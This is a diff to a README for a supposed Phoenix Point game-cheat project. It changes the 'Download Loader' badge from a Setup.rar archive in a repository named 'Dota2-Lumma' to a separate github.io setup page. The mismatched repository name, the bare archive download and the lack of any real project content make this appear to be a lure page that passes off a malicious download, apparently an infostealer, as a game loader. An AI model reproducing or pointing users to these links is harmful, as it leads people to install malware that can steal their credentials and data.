@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Phoenix Point Cheats
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://rewfdf.github.io/SetupPage)
 
 ---
 
@@ -38,5 +38,6 @@ configs/
 `Phoenix-Point-Cheats` · Updated: 2026-10-31
 
 **Tags:** `phoenix-point` `tactics` `turn-based` `sci-fi`
+
 
 
